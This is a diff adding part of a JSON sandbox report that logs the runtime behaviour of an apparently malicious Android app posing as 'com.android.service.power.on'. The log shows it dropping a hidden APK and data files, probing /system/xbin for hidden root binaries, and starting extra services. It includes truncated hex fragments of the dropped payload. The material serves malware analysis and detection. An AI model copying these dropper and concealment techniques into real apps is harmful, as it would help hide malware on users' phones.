+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 705548128,
+                    "data": "ls -l /system/xbin/.ls\nexit\n",
+                    "name": "pipe:[2837]",
+                    "time": 26.069636,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "data": "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n<int name=\"my_screen_height\" value=\"480\" />\n<int name=\"my_screen_width\" value=\"320\" />\n<string name=\"do__setResolution\">320*480</string>\n</map>\n",
+                    "name": "/data/data/com.android.service.power.on/shared_prefs/com.android.service.power.on_preferences.xml",
+                    "time": 24.658583,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "data": "504b0304140000000800e98b6b490c74239b5562000008df00000b000000636c61737365732e646578edbd097c94d5d53f7eee334b76984c58c33649588635938098804b588241594232801014b20c104826938d4d5b83a262eb820b4a5d2a56ad6851112d5a575c8b8a4a152d6eadb6d6dad6b6da5a6b5b25ffefb9f7cccc3359b46fdff7fdfd7fffcfe71ff83ee7de73f7eddc7397e799bad0a6d4c0e41368cbf82f065ef9e9a7870f5ff987b34b961e701e4b3d7ff1674fdf1f48fe25518488362d99e225f92bff05518165f8af025352887e0b7a6e3ad18fd97d205110ee5f0c259a06fbae7ca2c01ea26353c1db4ff44fe02bc0713f510ad017f001a381b1c054e074a01ca804960367016b8026a00db81cb80eb81578087801780bf81df01720e901c40bf403b28191c018603c900f4c01a601a702338139c0e9c042a00a381ba8015603eb80266003700ed0015c045c06ec04ae07be0fdc093c003c01bc00bc0ebc07fc01f80ce804525141fd011f301e980acc00e6014b811aa011d8045c005c0e7c0fb80db817781878163802bc0d7c087c0a7c09241d20f202c3003f30193805980b048195c03aa01de800be0b5c0bdc02ec05de079c0f120d0526032b80adc00f806781f7807f02a31f223a036806ae065e06fe0a0cfc09d149c05940077003b00f7809f82390f230f2061402f380f5c056e03ae06ee067c0df80",
+                    "name": "/data/data/com.android.service.power.on/cache/protect.apk",
+                    "time": 0.316984,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 885,
+                    "tid": 1073870640,
+                    "data": "504b0304140000000800e98b6b490c74239b5562000008df00000b000000636c61737365732e646578edbd097c94d5d53f7eee334b76984c58c33649588635938098804b588241594232801014b20c104826938d4d5b83a262eb820b4a5d2a56ad6851112d5a575c8b8a4a152d6eadb6d6dad6b6da5a6b5b25ffefb9f7cccc3359b46fdff7fdfd7fffcfe71ff83ee7de73f7eddc7397e799bad0a6d4c0e41368cbf82f065ef9e9a7870f5ff987b34b961e701e4b3d7ff1674fdf1f48fe25518488362d99e225f92bff05518165f8af025352887e0b7a6e3ad18fd97d205110ee5f0c259a06fbae7ca2c01ea26353c1db4ff44fe02bc0713f510ad017f001a381b1c054e074a01ca804960367016b8026a00db81cb80eb81578087801780bf81df01720e901c40bf403b28191c018603c900f4c01a601a702338139c0e9c042a00a381ba8015603eb80266003700ed0015c045c06ec04ae07be0fdc093c003c01bc00bc0ebc07fc01f80ce804525141fd011f301e980acc00e6014b811aa011d8045c005c0e7c0fb80db817781878163802bc0d7c087c0a7c09241d20f202c3003f30193805980b048195c03aa01de800be0b5c0bdc02ec05de079c0f120d0526032b80adc00f806781f7807f02a31f223a036806ae065e06fe0a0cfc09d149c05940077003b00f7809f82390f230f2061402f380f5c056e03ae06ee067c0df80",
+                    "name": "/data/data/com.android.service.power.on/cache/protect.apk",
+                    "time": 59.511285,
+                    "processname": "com.android.service.power.on:daemon"
+                },
+                {
+                    "pid": 844,
+                    "tid": 705548128,
+                    "data": "ls -l /system/xbin/.ls\nexit\n",
+                    "name": "pipe:[2813]",
+                    "time": 25.428677,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 705520584,
+                    "data": "504b0304140008080800766c68490000000000000000000000000b000000636c61737365732e646578acbd076054c5fec73b737637a1852c09cd08b80484a008a11a6a421545a4855e4242028412124291128a82a28020a0080a12044429010404441144ae08284d44012b2a36ac57e582e47d67e6bb9b49c8fabff7bd277ef29d99dff43367ce9c33677753d31e2c15dba889d8757648c86d9f1c7cadd9b8b8d5e76a7c3bf9b13b7fba72ec447fcf89638ec814423cd8bb7184e07f951176c82374f86829c4cc4a42bc0e8dad2ac4038e10651a0ab11ef669ed855886389bb28468dfc911f3670b51d1ed88cae056701b8806b54063d01af402e920073c02e681c5601d78159c01d7413e08f138a22e6808e2400b700fb80f7401dd4022e80352c17830094c05b3c032b01dbc018e839f403e708738a22408071541751003ee020dc1dda0356803ee077d4112c8040f8127c11ab00d1c051f81efc115900f9c5047940591e0165013d401f5400310075a80b6a003b81f7405e960347804f4e885f6804920073c0c1e014bc04ab00e6c001bc176b0171c02c7c15970115c023f821be096de8e6804ee0583413698061e028f82c7c1d36025580b5e063bc0abe03078177c003e03df817f831be0f63e38066010980636833de073f01b907dd16f603e380f6e80f87e383ee025b00bec01af8343e03d70167c0cae81b0fe8ef082",
+                    "name": "/data/data/com.android.service.power.on/files/.androidsdata/270797269",
+                    "time": 28.450692,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "data": "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n<long name=\"do_weakactivtrytime\" value=\"1426266955079\" />\n<int name=\"my_screen_height\" value=\"480\" />\n<int name=\"my_screen_width\" value=\"320\" />\n<string name=\"do__setResolution\">320*480</string>\n</map>\n",
+                    "name": "/data/data/com.android.service.power.on/shared_prefs/com.android.service.power.on_preferences.xml",
+                    "time": 24.738553,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 705548128,
+                    "data": "ls -l /system/xbin/.ld.js\nexit\n",
+                    "name": "pipe:[2833]",
+                    "time": 25.959002,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 705520584,
+                    "data": "d72c389cf26db571dafbc17fdb2d0ed235eb694bc6ae739064929ce1aab5d382db6fd1639a989967179353372cccdcd11b3ac31e720a9d36e663b9d31686614fbab37e9f85d1c975d9d25f22f43e6c3f63c9caa3366c4a1c9024e408a38452dc16e24b2263f9238f413a45c8132a84de8d8041c20421fe3820432810c2094092304c2813129b0059c20421ba9985120a842aa16f0b6084502624ba5907618210df0ac81126098927984a9824c47b6c2516880bf03102bfe05cc8f6803b4e88f63223a14c483ec9961022dba812a144e87e8ad513a608a93eea45486f675184e80eb69350dc81ee6910bfb2fcb1a759286192904ab200426527611773ec66f1fd2c8a10db4bd509d17dd4653fe508b934e1208b3a84e285da65d7fc45c7302eaaf9de89837b724395c3993d6c9b2a92b1e11464ec1b961c3ac2413c0ae83d660b6598159843d96543349ab52d95ce4274326bafb6e5d000a42608d16701e5676d1ed2aed174c6830fdbf4df9eb331df8c7183752e900b4eb398a9e7ec33366c03f33d0f187c9ef5183cfa36aca340195c04f1e3a82977dc5e6fcbdc0b90eb1be4cc1ab4692a460d7992a2f117ed976dd9ff2252f284c8095bf8a4c183ed8c86ca86388553276cccbc891390abbe4418b2c55ffb021143cef8d7f03bfee4bf93f27bfe4b50b98993b6a1aa3fb11d15f929fcdadc2b80f8087a609010fb3907e8e7",
+                    "name": "/data/data/com.android.service.power.on/files/.androidsdata/270797269",
+                    "time": 47.939038,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 705520584,
+                    "data": "7766147d909e69b799f9087fd3f7792c6b1cab12defdde284c552a98befcef7ef4bf8ef8e8d41e235ffc122b17829b24929eda5f7dbcf77bf4c619831423cd90",
+                    "name": "/data/data/com.android.service.power.on/files/.androidsdata/libc.dat",
+                    "time": 58.56853,
+                    "processname": "com.android.service.power.on"
+                }
+            ],
+            "servicestart": [
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "name": "com.rain.dawn.flow.se.WService",
+                    "time": 58.579723,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "name": "com.rain.dawn.flow.se.UJService",
+                    "time": 58.638086,
+                    "processname": "com.android.service.power.on"
+                }
+            ]
+        }
+    }
+}
